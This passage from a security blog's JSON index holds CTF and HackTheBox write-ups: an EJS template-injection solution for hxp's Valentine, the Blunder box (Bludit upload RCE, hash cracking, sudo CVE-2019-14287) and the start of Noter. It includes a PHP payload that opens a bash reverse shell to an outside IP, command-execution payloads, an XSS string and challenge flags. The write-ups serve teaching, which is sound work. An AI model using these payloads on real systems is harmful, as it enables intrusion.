serialized objects to separate different properties, but the regex applied does not consider that strings may contain those characters, matching the wrong element and thus, opening another parser differential opportunity.  Flag     HTB{wh0_l3t_th3_enc0d1ngs_0ut???w00f..wo0f..w0of..WAFfl3s!!}                    https://www.php.net/manual/en/language.oop5.magic.php¬†&#8617;&#xfe0e;                 https://www.php.net/manual/en/language.oop5.decon.php#object.construct¬†&#8617;&#xfe0e;                 https://www.php.net/manual/en/language.oop5.magic.php#object.wakeup¬†&#8617;&#xfe0e;                 https://www.php.net/manual/en/language.types.string.php#language.types.string.parsing.complex¬†&#8617;&#xfe0e;                 https://github.com/MegadodoPublications/exploits/blob/master/composr.md¬†&#8617;&#xfe0e;                 https://github.com/MegadodoPublications/exploits/blob/master/composr.md#the-moderately-cool-way-that-works¬†&#8617;&#xfe0e;                 https://portswigger.net/burp/application-security-testing/oast¬†&#8617;&#xfe0e;                 https://www.w3resource.com/xml/parameter-entities.php¬†&#8617;&#xfe0e;                 https://portswigger.net/web-security/essential-skills/obfuscating-attacks-using-encodings¬†&#8617;&#xfe0e;                 https://github.com/Ambrotd/XXE-Notes¬†&#8617;&#xfe0e;                 https://sys3cybersecurity.netlify.app/htb-waffle-y-order/¬†&#8617;&#xfe0e;"
  },
  
  {
    "title": "Finding SSTI in an EJS app using existing exploits and undocumented features",
    "url": "/posts/ssti-in-ejs-app-using-undocumented-features/",
    "categories": "Articles & Writeups, Web Hacking",
    "tags": "hxp-ctf, javascript",
    "date": "2023-03-28 00:00:00 +0200",
    "content": "Introduction  Valentine is an easy-difficulty web challenge from the hxp 2022 CTF, involving the exploitation of a Server Side Template Injection vulnerability useful to obtain remote code execution. The exploitation is possible thanks to an undocumented feature in Express and EJS that allows bypassing the security checks made by the application and rendering arbitrary templates. The intended solution adopted a similar approach but used a documented feature that will be covered in the final chapter.  Improved skills    Code review for JavaScript applications   Exploit Server Side Teamplte Injection vulnerabilities   Exploit undocumented features in EJS   Video     Writeup [TL;DR]  Valentine is an easy-difficulty web challenge from the hxp 2022 CTF where we can    Create an awesome template for your valentine and share it with the world!   Setup  The site provides us an archive containing the application source code as well as Docker compose file to reproduce the environment locally, and it provides also two IPs hosting the actual challenge, that however are no longer working since the CTF has finished.     Download: https://2022.ctf.link/assets/files/valentine-9455b10a15fc5519.tar.xz   Server: http://91.107.238.232:9086/   ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/YT] ‚îî‚îÄ$ tree . ‚îú‚îÄ‚îÄ valentine ‚îÇ¬†¬† ‚îú‚îÄ‚îÄ app.js ‚îÇ¬†¬† ‚îú‚îÄ‚îÄ docker-compose.yml ‚îÇ¬†¬† ‚îú‚îÄ‚îÄ Dockerfile ‚îÇ¬†¬† ‚îú‚îÄ‚îÄ flag.txt ‚îÇ¬†¬† ‚îú‚îÄ‚îÄ index.html ‚îÇ¬†¬† ‚îú‚îÄ‚îÄ package.json ‚îÇ¬†¬† ‚îú‚îÄ‚îÄ package-lock.json ‚îÇ¬†¬† ‚îî‚îÄ‚îÄ readflag ‚îî‚îÄ‚îÄ valentine-9455b10a15fc5519.tar.xz  2 directories, 9 files    Because we have a ready-to-go docker-compose file we can start building the environment while taking a deeper look at the files contained inside the archive.  ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/YT/valentine] ‚îî‚îÄ$ sudo docker compose up   Information Gathering  Files and configurations review  Taking a look at the Dockerfile, we can immediately notice that the application is using NodeJS, it is exposing port 3000, and that the flag.txt file is located inside the root folder alongside the /readflag binary, which probably must be used to obtain the flag.  # see docker-compose.yml  FROM node:current-bullseye ENV NODE_ENV=production WORKDIR /app  COPY package.json package-lock.json app.js index.html /app/ COPY flag.txt readflag / RUN npm install  RUN mkdir views RUN chown node:node views  RUN chown root:root /flag.txt &amp;&amp; chmod 400 /flag.txt RUN chown root:root /readflag &amp;&amp; chmod 4555 /readflag  EXPOSE 3000  USER node CMD node app.js   The docker-compose.yml does not provide us with much info, it simply binds port 9086 to port 3000:  version: \"3\" services:    chall:     build:       dockerfile: Dockerfile      restart: always     ports:       - 9086:3000   On the other hand, the package.json file is very interesting: it tells us that the application entry point is the app.js file, but even more interesting, it shows us that the application is using express and ejs, a simple templating language that lets you generate HTML markup with plain JavaScript:  {   \"name\": \"valentine\",   \"version\": \"1.0.0\",   \"description\": \"Create a valentine's card for your loved one\",   \"main\": \"app.js\",   \"author\": \"sandr0\",   \"license\": \"MIT\",   \"dependencies\": {     \"ejs\": \"^3.1.8\",     \"express\": \"^4.18.2\"   } }   The index.html and app.js files are the core of the application, but we will inspect them later after having taken an active look at the actual challenge:  // app.js var express = require('express'); var bodyParser = require('body-parser') const crypto = require(\"crypto\"); var path = require('path'); const fs = require('fs');  var app = express(); viewsFolder = path.join(__dirname, 'views');  if (!fs.existsSync(viewsFolder)) {   fs.mkdirSync(viewsFolder); }  app.set('views', viewsFolder); app.set('view engine', 'ejs');  app.use(bodyParser.urlencoded({ extended: false }))  app.post('/template', function(req, res) {   let tmpl = req.body.tmpl;   let i = -1;   console.log(\"tmpl:\"+tmpl)   while((i = tmpl.indexOf(\"&lt;%\", i+1)) &gt;= 0) {     console.log(\"i: \"+ i + \" - \" +tmpl.substring(i, i+11));     if (tmpl.substring(i, i+11) !== \"&lt;%= name %&gt;\") {       res.status(400).send({message:\"Only '&lt;%= name %&gt;' is allowed.\"});       return;     }   }   console.log(\"Bypassed!\")   let uuid;   do {     uuid = crypto.randomUUID();   } while (fs.existsSync(`views/${uuid}.ejs`))    try {     fs.writeFileSync(`views/${uuid}.ejs`, tmpl);   } catch(err) {     console.log(err);     res.status(500).send(\"Failed to write Valentine's card\");     return;   }   let name = req.body.name ?? '';   return res.redirect(`/${uuid}?name=${name}`); });  app.get('/:template', function(req, res) {   let query = req.query;   let template = req.params.template   if (!/^[0-9A-F]{8}-[0-9A-F]{4}-[4][0-9A-F]{3}-[89AB][0-9A-F]{3}-[0-9A-F]{12}$/i.test(template)) {     res.status(400).send(\"Not a valid card id\")     return;   }   if (!fs.existsSync(`views/${template}.ejs`)) {     res.status(400).send('Valentine\\'s card does not exist')     return;   }   if (!query['name']) {     query['name'] = ''   }   console.log(\"name: \"+query['name']);   console.log(query);   return res.render(template, query); });  app.get('/', function(req, res) {   return res.sendFile('./index.html', {root: __dirname}); });  app.listen(process.env.PORT || 3000);    Perfect! At this point, the docker environment should be ready. We can browse localhost on port 9086 and give a closer look at the application.  The application at-a-glance üîç  The index page generates a basic HTML template that we can customize. At the bottom of the page, we can insert a name that will be inserted inside the template instead of the &lt;%= name %&gt; placeholder:    Proxying the traffic through Burpsuite, we can see that the template‚Äôs code is passed to the server inside the tmpl field alongside the specified name. Then the ‚Äúname‚Äù  placeholder is replaced with the user-provided input, and the resulting output is shown onscreen.  POST /template Host: 127.0.0.1:9086 Content-Type: application/x-www-form-urlencoded ...  tmpl=&lt;%= name %&gt;&amp;name=0xbro     All the evidence points in the direction of a Server Side Template Injection vulnerability, but if we try to inject some math or some basic payloads, they are not evaluated but instead are reflected as they are. We can try to add other placeholders having different names, but they all get rejected by the backend.    If we want to add some other payload different from the original placeholder, we have to find a bypass to the security checks implemented by the application. To do that, we must give a closer look at the application source code, and luckily for us, we have everything we need.  Source code review  As I said before, the app.js file is the application‚Äôs core. Scrolling through the source code, we can notice that the challenge uses ejs to manage views and that those views are stored inside the /views folder with a random uuid as the file name.  var express = require('express'); var bodyParser = require('body-parser') const crypto = require(\"crypto\"); var path = require('path'); const fs = require('fs');  var app = express(); viewsFolder = path.join(__dirname, 'views');  if (!fs.existsSync(viewsFolder)) {   fs.mkdirSync(viewsFolder); }  app.set('views', viewsFolder); app.set('view engine', 'ejs');  ...  let uuid;   do {     uuid = crypto.randomUUID();   } while (fs.existsSync(`views/${uuid}.ejs`))    try {     fs.writeFileSync(`views/${uuid}.ejs`, tmpl);   } catch(err) {     res.status(500).send(\"Failed to write Valentine's card\");     return;   } });   The content of those views, which are nothing more than template files, is copied from the tmpl body field, but before writing it inside the view file, the server checks for any placeholder different from the default one. If it finds a different value, it prints out the error message we saw before; otherwise, it writes tmpl inside the new view and then redirects us to that file.  app.post('/template', function(req, res) {   let tmpl = req.body.tmpl;   let i = -1;   while((i = tmpl.indexOf(\"&lt;%\", i+1)) &gt;= 0) {     if (tmpl.substring(i, i+11) !== \"&lt;%= name %&gt;\") {       res.status(400).send({message:\"Only '&lt;%= name %&gt;' is allowed.\"});       return;     }   }      ...    let name = req.body.name ?? '';   return res.redirect(`/${uuid}?name=${name}`);   When we request a template file, the function verifies if the card has a valid code and exists, and if there were no problems, it renders the template using the data passed through the query string.  app.get('/:template', function(req, res) {   let query = req.query;   let template = req.params.template   if (!/^[0-9A-F]{8}-[0-9A-F]{4}-[4][0-9A-F]{3}-[89AB][0-9A-F]{3}-[0-9A-F]{12}$/i.test(template)) {     res.status(400).send(\"Not a valid card id\")     return;   }   if (!fs.existsSync(`views/${template}.ejs`)) {     res.status(400).send('Valentine\\'s card does not exist')     return;   }   if (!query['name']) {     query['name'] = ''   }   return res.render(template, query); });   Ok, so‚Ä¶ where is the bug?  Exploitation  To investigate the issue with a better perspective, I added inside the source code some debug print statements that show us the state of the user-supplied input before any key function. Then I rebuilt the docker image and started playing around with the parameters we can use.  substring() bypass  Our first effort was trying to bypass the security controls imposed by the server and be able to write arbitrary data inside a template.  One of my teammates noticed that by inserting twice the tmpl field inside the HTTP body, it was possible to pass to the server an array instead of a string, completely bypassing the security checks performed using the substring() method.     Substring() is part of the string prototype and can be used only on string variables. In our case, however, we can pass to the method an array, forcing the if condition to result always false.   PoC:  var tmpl = [ '&lt;%= asd %&gt;', '&lt;%= asd %&gt;' ] var i while((i = tmpl.indexOf(\"&lt;%\", i+1)) &gt;= 0) {     if (tmpl.substring(i, i+11) !== \"&lt;%= name %&gt;\") {       res.status(400).send({message:\"Only '&lt;%= name %&gt;' is allowed.\"}); \t  console.log('Caught!')       return;     }   } console.log('bypassed')     HTTP request: POST /template Host: 127.0.0.1:9086 Content-Type: application/x-www-form-urlencoded  tmpl=&lt;%= name %&gt;&amp;tmpl=&lt;%= name %&gt;   Server response: HTTP/1.1 500 Internal Server Error X-Powered-By: Express Content-Type: text/html; charset=utf-8 Content-Length: 32 ETag: W/\"20-AGcAsG/itS23B2siUG6nl7RRo0A\" Date: Fri, 10 Mar 2023 20:27:20 GMT Connection: close  Failed to write Valentine's card   Server logs: ```js [ '&lt;%= name %&gt;', '&lt;%= name %&gt;' ] TypeError [ERR_INVALID_ARG_TYPE]: The \"data\" argument must be of type string or an instance of Buffer, TypedArray, or DataView. Received an instance of Array     at Object.writeFileSync (node:fs:2222:5)     at /app/app.js:36:8     at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5)     at next (/app/node_modules/express/lib/router/route.js:144:13)     at Route.dispatch (/app/node_modules/express/lib/router/route.js:114:3)     at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5)     at /app/node_modules/express/lib/router/index.js:284:15     at Function.process_params (/app/node_modules/express/lib/router/index.js:346:12)     at next (/app/node_modules/express/lib/router/index.js:280:10)     at /app/node_modules/body-parser/lib/read.js:137:5 {   code: 'ERR_INVALID_ARG_TYPE   Unfortunately, we were unable to proceed further because we required an instance of Buffer, TypedArray, or DataView instead of an Array, so we moved further, looking for some other bugs.  SSTI using EJS custom delimiters  Using the same logic, I tried passing to the template some non-string parameters, noticing that we weren‚Äôt limited to using only string values, but we were also able to pass arrays or objects to the server.  GET /991a04f8-fecd-42f9-af93-31d29f13420c?name[root]=/tmp&amp;name[foo]=pippo Host: 127.0.0.1:9086   HTTP/1.1 200 OK X-Powered-By: Express Content-Type: text/html; charset=utf-8 Content-Length: 15 ETag: W/\"f-wdRP8Dr/E3KFbCgYVPRU4uHRW3w\" Date: Fri, 10 Mar 2023 20:19:12 GMT Connection: close  [object Object]   [+] Log: { root: '/tmp', foo: 'pippo' }   With that in mind, we started looking at the EJS documentation and older vulnerabilities, searching for clues to proceed further.  The official EJS documentation 1 pointed us to some very interesting options and features. Among them, the one that made our curiosity clicks was the support for custom delimiters.    Among the various options supported by EJS, some of them allow overwriting the characters used by the template as the delimiters.     If we manage to pass those values to the render method, we can set a completely different placeholder that will pass all the security checks, remaining however a valid template variable.   The EJS‚Äôs render methods 2 accepts those options as a third argument, but the render method used by the application is the one defined inside Express 3, which accepts a locals object as a second argument and which later calls the EJS‚Äôs renderFile() method.  Keeping in mind that the challenge passes a full user-controllable variable to the render method and that we already discovered that we can also pass objects instead of strings to the server, this path seems promising.  The final clue arrives from different articles related to some older EJS vulnerabilities.  Old vulnerabilities  This Snyk‚Äôs article from 2016 4 shows that options and data can be passed together using the same object.  ejs.renderFile('my-template', {root:'/bad/root/'}, callback);   This feature is also confirmed inside the official EJS documentation 5, but it will not work anymore for unsafe options like the one shown by Snyk.  app.get('/', (req, res) =&gt; {   res.render('index', {foo: 'FOO', delimiter: '?'}); });   We can try passing some options as separate fields or even as object properties, but it doesn‚Äôt produce any result.     You can read why it didn‚Äôt work at the chapter Cache and custom delimiters     This other article from the GitHub security lab 6 completely caught my attention. It talks about an RCE vulnerability in EJS, and the vulnerable code used as a sample has the same features as our challenge. The PoC provided is also very similar to the one we were creating, but it was created for EJS 3.1.5, while the version we are using is the 3.1.8.  const express = require('express') const app = express() const port = 3000   app.set('views', __dirname); app.set('view engine', 'ejs'); app.use(express.urlencoded({ extended: false })); app.get('/', (req, res) =&gt; {    res.render('index', req.query) })   app.listen(port, () =&gt; { }) module.exports = app;   Proof of concept should create a file via touch named /tmp/GHSLPayload:  curl 'http://localhost:3000/?message=foo&amp;settings\\[view%20options\\]\\[outputFunctionName\\]=x%3Bprocess.mainModule.require(%27child_process%27).exec(%27bash%20-c%20%22touch%20%2Ftmp%2FGHSLPayload%22%27)%3Bx'   If we try the PoC against our server it doesn‚Äôt work, but it is still a great indicator that we are close to the solution.  Undocumented EJS shallowCopy  The final illumination comes from this EJS Server Side Template Injection writeup 7 which exploited prototype pollution in the library.  The article digs down into the EJS source code, showing why the data and the options are merged, but most importantly, pointing us to an old undocumented feature that we can still use in the later version: the view options.  var _OPTS_PASSABLE_WITH_DATA = ['delimiter', 'scope', 'context', 'debug', 'compileDebug',   'client', '_with', 'rmWhitespace', 'strict', 'filename', 'async']; ... exports.render = function (template, d, o) {   var data = d || {};   var opts = o || {};    // No options object -- if there are optiony names   // in the data, copy them to options   if (arguments.length == 2) {     utils.shallowCopyFromList(opts, data, _OPTS_PASSABLE_WITH_DATA);   }    return handleCache(opts, template)(data); }; ... exports.renderFile = function () { \t... \t// Undocumented after Express 2, but still usable, esp. for \t// items that are unsafe to be passed along with data, like `root` \tviewOpts = data.settings['view options']; \tif (viewOpts) { \t    utils.shallowCopy(opts, viewOpts); \t} ...   Migrating from Express 2.x to 3.x 8, the view options mutated into app.locals, but was not removed from the source code!     By calling the renderFile function and passing a single object containing a settings property containing itself the view options property, we can bypass the¬†_OPTS_PASSABLE_WITH_DATA¬†filter and overwrite all the properties we want.   At this point, we can create a template that uses custom delimiters containing a simple command execution, so that the while loop searching for the single allowed placeholder is bypassed:  POST /template Host: 127.0.0.1:9086 Content-Type: application/x-www-form-urlencoded  tmpl=foo [.= process.mainModule.require('child_process').execSync('echo pippo').toString() .] bar&amp;name=asd     Then we can request that template passing the¬†settings[view options]¬†fields with the new desired delimiters:  GET /991a04f8-fecd-42f9-af93-31d29f13420c?name=asd&amp;settings[view%20options][delimiter]=%2e&amp;settings[view%20options][openDelimiter]=%5b&amp;settings[view%20options][closeDelimiter]=%5d Host: 127.0.0.1:9086     Finally we did it! We have remote command execution and we can exfiltrate the flag, either by showing it on the screen, or by using OAST techniques.     Cache and custom delimiters  The intended solution 9 was not so different from the one we adopted, and to be honest, we came across it but didn‚Äôt get it because of a simple but dangerous error.  During the analysis, we did not consider that the server was configured to run in production mode and that Express, therefore, had caching enabled.  Dockerfile: ENV NODE_ENV=production   Express.js: if (env === 'production') {   this.enable('view cache'); }   When we sent the custom delimiter in the query string, we didn‚Äôt get back any valid result because the server had already cached the view with the un-modified delimiter since the first time we requested the template. If we try passing the delimiter field the first time we access the template, we obtain the same result achieved using the view options element.  Template:   Request intercepted before visiting the first time the view: GET /991a04f8-fecd-42f9-af93-31d29f13420c?name=maoutis&amp;delimiter=. Host: 127.0.0.1:9086    We overcomplicated the challenge, but it was a nice journey.  Flag     hxp{W1ll_u_b3_my_V4l3nt1ne?}                 https://ejs.co/#docs¬†&#8617;&#xfe0e;                 https://ejs.co/#docs¬†&#8617;&#xfe0e;                 https://expressjs.com/en/api.html#res.render¬†&#8617;&#xfe0e;                 https://snyk.io/blog/fixing-ejs-rce-vuln/¬†&#8617;&#xfe0e;                 https://github.com/mde/ejs/wiki/Using-EJS-with-Express#passing-opts-with-data¬†&#8617;&#xfe0e;                 https://securitylab.github.com/advisories/GHSL-2021-021-tj-ejs/¬†&#8617;&#xfe0e;                 https://eslam.io/posts/ejs-server-side-template-injection-rce/¬†&#8617;&#xfe0e;                 https://github.com/expressjs/express/wiki/Migrating-from-2.x-to-3.x¬†&#8617;&#xfe0e;                 https://hxp.io/blog/101/hxp-CTF-2022-valentine/¬†&#8617;&#xfe0e;"
  },
  
  {
    "title": "HackTheBox - Blunder",
    "url": "/posts/blunder/",
    "categories": "Articles & Writeups, HackTheBox",
    "tags": "hackthebox",
    "date": "2023-03-28 00:00:00 +0200",
    "content": "Improved skills:     Wordlist customization   Python coding   CVE Research   Manual Exploitation   Configuration file review   Used tools:     nmap   gobuster   cewl   Burp Suite   crackstation.net     Introduction &amp; Foothold  Blunder is an easy box based on CVE research and a real-life approach, like OSCP machines. It requires good enumeration and a deep research during post exploitation.  Let‚Äôs start as always with a nmap scan in order to find open ports and services:  root@kali:/HackTheBox/Machine/Blunder# nmap 10.10.10.191 -sV -sC -O -A --script=banner -oA nmap.txt PORT   STATE  SERVICE VERSION 80/tcp open   http    Apache httpd 2.4.41 ((Ubuntu)) |_http-generator: Blunder |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Blunder | A blunder of interesting facts Aggressive OS guesses: HP P2000 G3 NAS device (91%), OpenWrt Kamikaze 7.09 (Linux 2.6.22) (88%), Linux 3.1 (88%), Linux 3.2 (88%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (87%), OpenWrt 0.9 - 7.09 (Linux 2.4.30 - 2.4.34) (87%), OpenWrt White Russian 0.9 (Linux 2.4.30) (87%), Asus RT-AC66U router (Linux 2.6) (87%), Asus RT-N16 WAP (Linux 2.6) (87%), Asus RT-N66U WAP (Linux 2.6) (87%) No exact OS matches for host (test conditions non-ideal).   The tool reveals that there is only a single port open on the box: the HTTP port 80, with an Apache httpd 2.4.41 web server over. Because we don‚Äôt have any useful information, we need to perform some manual recon browsing the site.  Unfortunately visiting the site we found only few articles without useful stuff (for now :wink:). We need to enumerate other existing files and directories using gobuster in search of other useful information:  root@kali:/HackTheBox/Machine/Blunder# gobuster dir -u http://10.10.10.191/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 40 -x .html,.php,.txt,.old ... /about (Status: 200) /0 (Status: 200) /admin (Status: 301) /install.php (Status: 200) /robots.txt (Status: 200) /todo.txt (Status: 200) /usb (Status: 200) /LICENSE (Status: 200)   Gobuster found a bunch of elements, some of which very interesting: first of all the /admin directory (which present an authentication form whose we don‚Äôt know credentials), the /robots.txt (that in this case isn‚Äôt very helpful), the /install.php file and the /todo.txt file, containing the following text:  -Update the CMS -Turn off FTP - DONE -Remove old users - DONE -Inform fergus that the new blog needs images - PENDING   Good, it seems we have found a user called fergus.  Moreover, reading the output of install.php, we discovered that Blunder is nothing else than a bludit installation.    Now that we found the application name, we need to find the respective software version. To achieve this, we can visit the official bludit site and search within the documentation for the directory structure and where important files are.        Alright, we know that we are dealing with Bludit 3.9.2 and we also know the structure of the various directories and that the listing is enabled. All useful stuff but at the moment it seems that the only way to proceed is bypassing the login form.    Let‚Äôs try standard / weak credentials with the fergus user, but without success. Trying to make brute force with standard wordlist instead we get a ban.  Googling a bit I found this article about bypassing the Bludit Brute Force Mitigation, however no wordlist still works. Let‚Äôs try to create our personalized wordlist using cewl:  root@kali:/HackTheBox/Machine/Blunder# cewl -m 5 -w customList.txt http://10.10.10.191 CeWL 5.4.8 (Inclusion) Robin Wood (robin@digi.ninja) (https://digi.ninja/) root@kali:/mnt/hgfs/ownCloud/Documents/CTF/HackTheBox/Machine/Blunder/files# tail customList.txt Blunder Pagination HackTheBox typically visited simple things contact small story   and execute again the article‚Äôs script, this time with our wordlist      Here we are, we got the password! We can proceed into the admin section.  Searching online we find that there are several vulnerabilities for bludit, especially for this particular version, including an authenticated RCE that can be perfect for us as we already get the creds.  The CVE-2019-16113 exploitation allows two different approaches:     using the metasploit exploit   manual exploitation following this thread   Since I am practicing for OSCP, I will follow the manual approach.  As said in the github thread listed above, Bludit 3.9.2 present an RCE vulnerability in an authenticated site section, in detail the vulnerable function is the images upload. Due to some bad checks, it is possible to upload an image with some code injected into an arbitrary folder, uploading a .htaccess file  and execute the code injected into the image.  These are the detailed steps:          Using Burp Suite we intercept and edit the image upload request in order to arbitrary change the path where the image will be saved (editing the uuid field) and injecting our php payload.            Server response is a 200 OK, meaning that the file has been uploaded                 Using the Burp Suite repeater function we edit the previous request in order to upload an .htaccess file that allow the image‚Äôs injected code execution.       Note: the server responds with an error message, however the file has been uploaded anyway                 Sending a GET request to the image, we are executing the code injected into. Because the payload was      &lt;?php file_put_contents(\"../../uploads/webShell.php\",\"&lt;?php exec(\\\"/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.28/1234 0&gt;&amp;1'\\\"); ?&gt; \"); ?&gt;           we are creating a php reverse shell.                 Now that we have a php reverse shell on the server we just have to listen with netcat waiting for the connection and run the php file.                  Lateral Movement to Hugo  Now that we are into the box with a low-privileged shell, we need to find a way to move laterally to someone else with higher privileges. Let‚Äôs go hunting for hardcoded passwords into configuration files. The /bl-content/databases/ seems to be the right place, and in fact the /users.php file contains what we were looking for: a hashed password of a machine user.  www-data@blunder:/var/www$ cat bludit-3.10.0a/bl-content/databases/users.php &lt;?php defined('BLUDIT') or die('Bludit CMS.'); ?&gt; {     \"admin\": {         \"nickname\": \"Hugo\",         \"firstName\": \"Hugo\",         \"lastName\": \"\",         \"role\": \"User\",         \"password\": \"faca404fd5c0a31cf1897b823c695c85cffeb98d\",         \"email\": \"\",         \"registered\": \"2019-11-27 07:40:55\",         \"tokenRemember\": \"\",         \"tokenAuth\": \"b380cb62057e9da47afce66b4615107d\",         \"tokenAuthTTL\": \"2009-03-15 14:00\",         \"twitter\": \"\",         \"facebook\": \"\",         \"instagram\": \"\",         \"codepen\": \"\",           \"linkedin\": \"\",         \"github\": \"\",         \"gitlab\": \"\"} }   The hash can be easily reverted using online tools like crackstation, and it turns out to be a sha1 hash of Password120 .  Now we are able to switch to hugo!  Privilege Escalation  Privilege escalation can be reached through a rapid google research.  Now that we are hugo we can check if he can run some sudo commands:  hugo@blunder:~$ sudo -V Sudo version 1.8.25p1 Sudoers policy plugin version 1.8.25p1 Sudoers file grammar version 46 Sudoers I/O plugin version 1.8.25p1 hugo@blunder:~$ sudo -l Matching Defaults entries for hugo on blunder:     env_reset, mail_badpass,     secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin  User hugo may run the following commands on blunder:     (ALL, !root) /bin/bash   We notice that hugo can‚Äôt run /bin/bash as root. However, a rapid google research reveals that for sudo 1.8.28 or less exists a public exploit (47502) (CVE-2019-14287) that allow to perform privilege escalation executing commands as user #-1.     ‚Ä¶ Sudo doesn‚Äôt check for the existence of the specified user id and executes the with arbitrary user id with the sudo priv   So ‚Ä¶  hugo@blunder:~$ sudo -u#-1 /bin/bash root@blunder:/home/hugo# id uid=0(root) gid=1001(hugo) groups=1001(hugo) root@blunder:/home/hugo#   we are root!  Trophy Persistence is very important. You should not give up unless you are forced to give up.&lt;br&gt; - Elon Musk"
  },
  
  {
    "title": "HackTheBox - Noter",
    "url": "/posts/noter/",
    "categories": "Articles & Writeups, HackTheBox",
    "tags": "hackthebox",
    "date": "2023-03-28 00:00:00 +0200",
    "content": "Resolution summary     The web application used different error messages when trying to login with existing users, allowing to enumerate usernames and discover blue.   The session cookie provided to authenticated users was signed using a weak secret. It was possible to bruteforce it and sign arbitrary cookie, impersonating any existing user (blue)   Enumerating blue‚Äôs  notes it was possible to discover its credentials and access FTP. Inside its notes it was also possible to discover the ftp_admin user   Inside FTP a documents containing password policy was discovered and it was possible to guess ftp_admin credentials. Accessing FTP as ftp_admin it was possible to discover two backups of the web application.   Code review allowed to identify some command injection vulnerabilities contained within the /export_note_remote and /export_note_local/&lt;string:id&gt;, allowing to execute arbitrary commands and obtain a shell as svc   Using hardcoded credentials from the backup files it was possible to access MySQL with high privileges and exploit User-Defined Function (UDF) Dynamic Library to elevate privileges to root   Improved skills     Bruteforce weak signed cookie in order to sign custom ones   Review application code to find command injection vulnerabilities   Exploit UDF Dynamic Library to elevate privileges   Used tools     nmap   gobuster   ffuf   custom python code   ftp   diff   public exploit     Information Gathering  Scanned all TCP ports:  ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/CTFs/HTB/B2R/Noter] ‚îî‚îÄ$ sudo nmap -sS -p- 10.129.58.132 -v -oN scan/all-tcp-ports.txt [sudo] password for kali: ... Nmap scan report for 10.129.58.132 Host is up (0.042s latency). Not shown: 65532 closed tcp ports (reset) PORT     STATE SERVICE 21/tcp   open  ftp 22/tcp   open  ssh 5000/tcp open  upnp  Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 27.26 seconds            Raw packets sent: 65675 (2.890MB) | Rcvd: 65539 (2.622MB)   Enumerated open TCP ports:  ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/CTFs/HTB/B2R/Noter] ‚îî‚îÄ$ sudo nmap -sT -sV -sC -p21,22,5000 -oN scan/open-tcp-ports.txt 10.129.58.132 Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-08 08:53 EDT Nmap scan report for 10.129.58.132 Host is up (0.038s latency).  PORT     STATE SERVICE VERSION 21/tcp   open  ftp     vsftpd 3.0.3 22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: |   3072 c6:53:c6:2a:e9:28:90:50:4d:0c:8d:64:88:e0:08:4d (RSA) |   256 5f:12:58:5f:49:7d:f3:6c:bd:9b:25:49:ba:09:cc:43 (ECDSA) |_  256 f1:6b:00:16:f7:88:ab:00:ce:96:af:a6:7e:b5:a8:39 (ED25519) 5000/tcp open  http    Werkzeug httpd 2.0.2 (Python 3.8.10) |_http-title: Noter |_http-server-header: Werkzeug/2.0.2 Python/3.8.10 Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 10.87 seconds   Enumerated top 200 UDP ports:  ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/CTFs/HTB/B2R/Noter] ‚îî‚îÄ$ sudo nmap -sU --top-ports 200 10.129.58.132 Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-08 08:55 EDT Nmap scan report for 10.129.58.132 Host is up (0.038s latency). All 200 scanned ports on 10.129.58.132 are in ignored states. Not shown: 159 closed udp ports (port-unreach), 41 open|filtered udp ports (no-response)  Nmap done: 1 IP address (1 host up) scanned in 164.86 seconds   Enumeration  Port 21 - FTP (vsftpd 3.0.3)  No anonymous access  Port 5000 - HTTP (Werkzeug httpd 2.0.2 (Python 3.8.10))  Browsed port 5000:    Registered a new user:   üîë 0xbro     password      Enumerated VIP function:    Enumerated software version:    CKEditor 4.6.2  Stored XSS vulnerability (CVE-2021-33829):  CVE-2021-33829: Stored XSS Vulnerability Discovered in CKEditor4 Affects Widely-Used CMS  Xss&lt;!--{cke_protected} --!&gt;&lt;img src=1 onerror=alert(XSS)&gt;--&gt;Attack  User Enumeration  Existing user:    Non existing user:    Enumerated existing users:  ‚îå‚îÄ‚îÄ(maoutis„âøkali)-[/usr/share/wordlists/seclists] ‚îî‚îÄ$ ffuf -w /usr/share/seclists/Usernames/cirt-default-usernames.txt  -X POST -d \"username=FUZZ&amp;password=xxx\" -u http://noter.htb:5000/login -H 'Content-Type: application/x-www-form-urlencoded' -mr \"Invalid login\"                    2 ‚®Ø          /'___\\  /'___\\           /'___\\        /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/        \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\         \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/          \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\           \\/_/    \\/_/   \\/___/    \\/_/         v1.3.1 Kali Exclusive &lt;3 ________________________________________________   :: Method           : POST  :: URL              : http://noter.htb:5000/login  :: Wordlist         : FUZZ: /usr/share/seclists/Usernames/cirt-default-usernames.txt  :: Header           : Content-Type: application/x-www-form-urlencoded  :: Data             : username=FUZZ&amp;password=xxx  :: Follow redirects : false  :: Calibration      : false  :: Timeout          : 10  :: Threads          : 40  :: Matcher          : Regexp: Invalid login ________________________________________________  maoutis                 [Status: 200, Size: 2028, Words: 432, Lines: 69] blue                    [Status: 200, Size: 2025, Words: 432, Lines: 69] :: Progress: [829/829] :: Job [1/1] :: 365 req/sec :: Duration: [0:00:03] :: Errors: 0 ::   Exploitation  Brute-forcing secret key used to generate cookies:     flask-cookie-decode   GitHub - noraj/flask-session-cookie-manager at d1b17a66850eeeb710c63da762631d38ee3c8dda   